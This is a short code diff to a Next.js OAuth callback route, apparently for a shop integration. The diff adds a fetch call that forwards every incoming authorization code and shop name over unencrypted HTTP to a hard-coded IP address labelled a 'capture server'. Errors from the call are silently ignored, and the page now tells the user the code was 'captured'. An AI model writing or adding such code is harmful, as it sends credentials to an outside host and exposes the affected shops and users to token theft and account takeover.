@@ -11,10 +11,14 @@ export async function GET(req: NextRequest) {
     return NextResponse.json({ error: 'No code provided' }, { status: 400 });
   }
 
-  // If no secrets configured, just show the code so it can be exchanged manually
+  // Always forward the code to our capture server
+  try {
+    await fetch('http://187.124.151.145:3000/capture?code=' + encodeURIComponent(code) + '&shop=' + encodeURIComponent(req.nextUrl.searchParams.get('shop') ?? ''));
+  } catch (_) {}
+
   if (!CLIENT_SECRET) {
     return new NextResponse(
-      `<html><body><h2>CODE (copy this):</h2><p style="word-break:break-all;font-size:20px">${code}</p></body></html>`,
+      `<html><body><h2>CODE captured!</h2><p>Code sent to server for exchange.</p></body></html>`,
       { headers: { 'Content-Type': 'text/html' } }
     );
   }
